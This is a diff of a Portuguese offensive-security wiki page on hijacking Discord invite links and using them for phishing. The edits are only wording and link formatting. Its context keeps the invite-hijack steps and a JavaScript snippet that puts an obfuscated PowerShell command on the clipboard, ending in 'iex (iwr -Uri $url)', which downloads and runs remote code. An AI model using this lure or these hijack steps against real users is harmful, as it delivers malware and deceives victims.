@@ -6,11 +6,11 @@ A vulnerabilidade do sistema de convites do Discord permite que atores de ameaç
 
 ## Tipos de Convite e Risco de Sequestro
 
-| Tipo de Convite       | Sequestre?  | Condição / Comentários                                                                                     |
-|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
+| Tipo de Convite       | Sequestreável? | Condição / Comentários                                                                                       |
+|-----------------------|----------------|--------------------------------------------------------------------------------------------------------------|
 | Link de Convite Temporário | ✅          | Após a expiração, o código se torna disponível e pode ser re-registrado como uma URL personalizada por um servidor com boost. |
 | Link de Convite Permanente | ⚠️          | Se excluído e consistindo apenas de letras minúsculas e dígitos, o código pode se tornar disponível novamente.        |
-| Link Personalizado    | ✅          | Se o servidor original perder seu Boost de Nível 3, seu convite personalizado se torna disponível para novo registro.    |
+| Link Personalizado    | ✅             | Se o servidor original perder seu Boost de Nível 3, seu convite personalizado se torna disponível para novo registro.    |
 
 ## Etapas de Exploração
 
@@ -24,7 +24,7 @@ A vulnerabilidade do sistema de convites do Discord permite que atores de ameaç
 - Para convites temporários, aguarde até que o convite original expire (ou exclua manualmente se você controlar a origem).
 - Para códigos que contêm letras maiúsculas, a variante em minúsculas pode ser reivindicada imediatamente, embora a redireção só ative após a expiração.
 4. Redirecionamento Silencioso
-- Usuários que visitam o link antigo são enviados sem problemas para o servidor controlado pelo atacante uma vez que o sequestro esteja ativo.
+- Usuários que visitam o link antigo são enviados de forma transparente para o servidor controlado pelo atacante uma vez que o sequestro esteja ativo.
 
 ## Fluxo de Phishing via Servidor Discord
 
@@ -44,7 +44,7 @@ const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9
 `iex (iwr -Uri $url)"`;
 navigator.clipboard.writeText(cmd);
 ```
-Esta abordagem evita downloads diretos de arquivos e aproveita elementos de interface familiar para reduzir a suspeita do usuário.
+Essa abordagem evita downloads diretos de arquivos e aproveita elementos de UI familiares para reduzir a suspeita do usuário.
 
 ## Mitigações
 
@@ -55,7 +55,7 @@ Esta abordagem evita downloads diretos de arquivos e aproveita elementos de inte
 
 ## Referências
 
-- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
-- Discord Custom Invite Link Documentation – https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link
+- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
+- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
 
 {{#include ../../banners/hacktricks-training.md}}
